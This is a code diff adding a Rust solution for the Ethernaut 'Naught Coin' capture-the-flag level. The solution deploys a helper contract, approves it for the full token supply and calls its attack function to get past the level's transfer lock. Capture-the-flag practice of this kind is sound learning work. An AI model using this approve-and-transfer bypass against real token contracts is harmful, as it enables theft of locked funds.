@@ -11,6 +11,12 @@ use ctf::ethereum::ethernaut::lvl15_naught_coin::*;
 
 pub struct Exploit;
 
+alloy::sol!(
+    #[sol(rpc)]
+    NaughtCoinExploit,
+    "out/NaughtCoinExploit.sol/NaughtCoinExploit.json"
+);
+
 #[async_trait]
 impl ctf::Exploit for Exploit {
     type Target = Target;
@@ -20,8 +26,19 @@ impl ctf::Exploit for Exploit {
         target: &Self::Target,
         offender: &Actor,
     ) -> eyre::Result<()> {
-        // TODO: exploit the level
-        let _ = (target, offender);
+        let exploit = NaughtCoinExploit::deploy(offender.provider()).await?;
+
+        let contract = NaughtCoin::new(target.address, offender.provider());
+        let supply = contract.INITIAL_SUPPLY().call().await?;
+        contract
+            .approve(*exploit.address(), supply)
+            .send()
+            .await?
+            .watch()
+            .await?;
+
+        exploit.attack(target.address).send().await?.watch().await?;
+
         Ok(())
     }
 }
